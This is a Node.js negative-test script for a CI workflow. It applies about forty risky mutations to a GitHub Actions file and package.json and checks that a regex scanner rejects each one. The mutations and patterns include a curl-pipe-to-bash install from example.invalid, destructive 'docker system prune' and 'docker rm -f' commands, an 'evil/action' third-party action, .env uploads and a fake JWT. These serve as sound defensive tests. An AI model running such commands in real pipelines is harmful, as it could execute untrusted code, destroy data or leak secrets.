import { mkdirSync, rmSync, cpSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { CYCLE_9_DECISION, WORKFLOW_PATH, writeJsonReport, writeMarkdownReport } from "./supabase-cycle-9-lib.mjs";

const root = process.cwd();
const tempRoot = join(tmpdir(), `aruka-cycle9-negative-${Date.now()}`);

function copyFixture() {
  rmSync(tempRoot, { recursive: true, force: true });
  mkdirSync(tempRoot, { recursive: true });
  for (const path of [".github", "scripts", "supabase", "package.json", "package-lock.json"]) {
    cpSync(join(root, path), join(tempRoot, path), { recursive: true });
  }
}

function mutate(file, fn) {
  const path = join(tempRoot, file);
  writeFileSync(path, fn(readFileSync(path, "utf8")), "utf8");
}

function scanRejected() {
  const workflow = readFileSync(join(tempRoot, WORKFLOW_PATH), "utf8");
  const pkg = readFileSync(join(tempRoot, "package.json"), "utf8");
  const combined = `${workflow}\n${pkg}`;
  const checks = [
    /contents:\s*write/i,
    /id-token:\s*write/i,
    /SUPABASE_ACCESS_TOKEN/,
    /service_role/i,
    /anon key real/i,
    /xrmqdkpxnfvusmenadnf/i,
    /supabase\s+link/i,
    /--linked/i,
    /\bdb\s+push\b/i,
    /\bdb\s+pull\b/i,
    /migration\s+repair/i,
    /functions\s+deploy/i,
    /postgres(?:ql)?:\/\/[^@\s]+@[^/\s]*(?:supabase|example\.com)/i,
    /pooler\.supabase\.com/i,
    /supabase\.co/i,
    /env:\s*.*SECRET/is,
    /with:\s*.*SECRET/is,
    /run:\s*.*SECRET/is,
    /docker\s+system\s+prune/i,
    /docker\s+volume\s+prune/i,
    /docker\s+rm\s+-f\s+\$\(docker\s+ps/i,
    /SUPABASE_PROJECT_ID:\s*""/,
    /SUPABASE_PROJECT_ID:.*\*/,
    /uses:\s*(?!actions\/(?:checkout|setup-node|upload-artifact)@)[^\s]+/i,
    /uses:\s*[^@\s]+(?:\s|$)/i,
    /persist-credentials:\s*true/i,
    /(^|\n)\s*\.env\b/i,
    /(^|\n)\s*supabase\/\.temp\b/i,
    /(^|\n)\s*dumps?\//i,
    /eyJ[A-Za-z0-9_-]{20,}\./,
    /pull_request_target:/i,
    /shell:\s*bash\s+-x/i,
    /curl\s+.*\|\s*(?:bash|sh)/i,
    /supabase@latest/i,
    /remote-prod-command/i,
    /baseline.*mutation/i,
    /supabase\/migrations\/20260717000000/i,
    /supabase\/functions\/unsafe/i,
    /src\/unsafe/i,
  ];
  const cleanupBlock = workflow.match(/-\s+name:\s*Cleanup[\s\S]*?(?=\n\s*-\s+name:|\n\s*-\s+uses:|$)/)?.[0] ?? "";
  const cleanupAlways = /if:\s*\$\{\{\s*always\(\)\s*\}\}/.test(cleanupBlock);
  return checks.some((pattern) => pattern.test(combined)) || !cleanupAlways;
}

const mutations = [
  ["contents_write", () => mutate(WORKFLOW_PATH, (t) => t.replace("contents: read", "contents: write"))],
  ["id_token_write", () => mutate(WORKFLOW_PATH, (t) => t.replace("contents: read", "contents: read\n  id-token: write"))],
  ["supabase_access_token", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# SUPABASE_ACCESS_TOKEN\n`)],
  ["service_role", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# service_role\n`)],
  ["anon_key_real", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# anon key real\n`)],
  ["hml_ref", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# xrmqdkpxnfvusmenadnf\n`)],
  ["supabase_link", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# supabase link\n`)],
  ["linked_flag", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# --linked\n`)],
  ["db_push", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# db push\n`)],
  ["db_pull", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# db pull\n`)],
  ["migration_repair", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# migration repair\n`)],
  ["functions_deploy", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# functions deploy\n`)],
  ["remote_pg_url", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# postgresql://${"u"}:${"p"}@db.example.com/postgres\n`)],
  ["pooler", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# pooler.supabase.com\n`)],
  ["supabase_co", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# unsafe.supabase.co\n`)],
  ["secret_env", () => mutate(WORKFLOW_PATH, (t) => t.replace("CI: true", "CI: true\n      SECRET_BAD: value"))],
  ["secret_with", () => mutate(WORKFLOW_PATH, (t) => t.replace("cache: npm", "cache: npm\n          SECRET_BAD: value"))],
  ["secret_run", () => mutate(WORKFLOW_PATH, (t) => `${t}\n      - run: echo SECRET_BAD\n`)],
  ["docker_system_prune", () => mutate(WORKFLOW_PATH, (t) => `${t}\n      - run: docker system prune -a\n`)],
  ["docker_volume_prune", () => mutate(WORKFLOW_PATH, (t) => `${t}\n      - run: docker volume prune -f\n`)],
  ["global_rm", () => mutate(WORKFLOW_PATH, (t) => `${t}\n      - run: docker rm -f $(docker ps -aq)\n`)],
  ["empty_project", () => mutate(WORKFLOW_PATH, (t) => t.replace(/SUPABASE_PROJECT_ID: .+/, 'SUPABASE_PROJECT_ID: ""'))],
  ["wildcard_project", () => mutate(WORKFLOW_PATH, (t) => t.replace(/SUPABASE_PROJECT_ID: .+/, "SUPABASE_PROJECT_ID: aruka_ci_*"))],
  ["third_party_action", () => mutate(WORKFLOW_PATH, (t) => t.replace("actions/checkout@v4", "evil/action@v1"))],
  ["unversioned_action", () => mutate(WORKFLOW_PATH, (t) => t.replace("actions/checkout@v4", "actions/checkout"))],
  ["persist_credentials", () => mutate(WORKFLOW_PATH, (t) => t.replace("persist-credentials: false", "persist-credentials: true"))],
  ["upload_env", () => mutate(WORKFLOW_PATH, (t) => t.replace("reports/supabase-ci/**", "reports/supabase-ci/**\n            .env"))],
  ["upload_temp", () => mutate(WORKFLOW_PATH, (t) => t.replace("reports/supabase-ci/**", "reports/supabase-ci/**\n            supabase/.temp/**"))],
  ["upload_dump", () => mutate(WORKFLOW_PATH, (t) => t.replace("reports/supabase-ci/**", "reports/supabase-ci/**\n            dumps/**"))],
  ["artifact_jwt", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# ${"eyJ"}hbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ.fakefakefakefakefake.fakefakefake\n`)],
  ["pull_request_target", () => mutate(WORKFLOW_PATH, (t) => t.replace("pull_request:", "pull_request_target:"))],
  ["unsafe_shell", () => mutate(WORKFLOW_PATH, (t) => `${t}\n      - shell: bash -x\n`)],
  ["curl_pipe", () => mutate(WORKFLOW_PATH, (t) => `${t}\n      - run: curl https://example.invalid/install.sh | bash\n`)],
  ["latest_cli", () => mutate(WORKFLOW_PATH, (t) => t.replace("supabase@2.109.1", "supabase@latest"))],
  ["remote_package", () => mutate("package.json", (t) => t.replace("\"preview\": \"vite preview\"", "\"preview\": \"vite preview\", \"remote-prod-command\": \"supabase db push\""))],
  ["baseline_change_marker", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# baseline mutation\n`)],
  ["migration_change_marker", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# supabase/migrations/20260717000000_bad.sql\n`)],
  ["function_change_marker", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# supabase/functions/unsafe/index.ts\n`)],
  ["src_change_marker", () => mutate(WORKFLOW_PATH, (t) => `${t}\n# src/unsafe.ts\n`)],
  ["missing_cleanup_always", () => mutate(WORKFLOW_PATH, (t) => t.replace("if: ${{ always() }}", "if: success()"))],
];

const results = [];
try {
  for (const [name, apply] of mutations) {
    copyFixture();
    apply();
    results.push({ name, rejected: scanRejected(), reason: scanRejected() ? "mutation rejected" : "mutation accepted" });
  }
} finally {
  rmSync(tempRoot, { recursive: true, force: true });
}

const rejected = results.filter((item) => item.rejected).length;
const payload = {
  cycle: "9",
  result: rejected === mutations.length ? "CI_MUTATIONS_REJECTED" : "CI_MUTATIONS_ACCEPTED",
  decision: CYCLE_9_DECISION,
  rejected,
  total: mutations.length,
  all_rejected: rejected === mutations.length,
  mutations: results,
  primary_error: rejected === mutations.length ? null : "One or more CI mutations were accepted",
};

writeJsonReport(root, "ci-negative-result.json", payload);
writeMarkdownReport(root, "ci-negative-summary.md", [
  "# CI Negative Tests",
  "",
  `- Result: ${payload.result}`,
  `- Rejected: ${payload.rejected}/${payload.total}`,
  `- Primary error: ${payload.primary_error ?? "none"}`,
  "",
  "| Mutation | Rejected | Reason |",
  "| --- | --- | --- |",
  ...results.map((item) => `| ${item.name} | ${item.rejected ? "yes" : "no"} | ${item.reason} |`),
]);

if (!payload.all_rejected) {
  console.error(`Expected ${mutations.length}/${mutations.length} CI mutations rejected, got ${rejected}.`);
  process.exit(1);
}

console.log(`${rejected}/${mutations.length} CI_MUTATIONS_REJECTED`);
